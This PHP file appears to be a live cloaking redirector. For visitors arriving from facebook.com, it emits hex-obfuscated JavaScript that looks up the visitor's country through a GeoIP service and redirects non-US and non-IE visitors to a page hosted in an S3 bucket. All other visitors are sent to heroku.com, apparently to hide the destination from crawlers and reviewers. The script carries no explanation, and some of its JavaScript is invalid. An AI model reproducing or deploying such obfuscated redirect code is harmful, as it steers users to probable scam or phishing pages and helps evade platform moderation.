<?php
  function md5rand($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="0123456789";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val) 
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }
      function shkronja($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val) 
    {                                                                     
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }



    ?>
<?php






{
$randval = rand();
if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {


                             
echo "<script>\n";
echo "var _0x5211=[\"\x47\x45\x54\",\"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69\",\"\x6F\x70\x65\x6E\",\"\x73\x65\x6E\x64\",\"\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\",\"\x70\x61\x72\x73\x65\",\"\x63\x6F\x64\x65\",\"\x63\x6F\x75\x6E\x74\x72\x79\",\"\x55\x53\",\"\x49\x45\",\"\x68\x72\x65\x66\",\"\x6C\x6F\x63\x61\x74\x69\x6F\x6E\",\"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x33\x2D\x75\x73\x2D\x77\x65\x73\x74\x2D\x32\x2E\x61\x6D\x61\x7A\x6F\x6E\x61\x77\x73\x2E\x63\x6F\x6D\x2F\x72\x65\x64\x69\x31\x32\x33\x34\x2F\x72\x65\x64\x2E\x68\x74\x6D\x6C\"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x5211[2]](_0x5211[0],_0x5211[1],false);xmlhttpz[_0x5211[3]]();var get=JSON[_0x5211[5]](xmlhttpz[_0x5211[4]]);var country=get[_0x5211[7]][_0x5211[6]];if(country== _0x5211[8]){exit}else {if(country== _0x5211[9]){exit}else {top[_0x5211[11]][_0x5211[10]]= _0x5211[12]}}\n";
echo "</script>\n";


}
else {
     //Google brought me to this page.
    header("Location: https://www.heroku.com/");//.$randval);
   //exit();
}



  }



?>
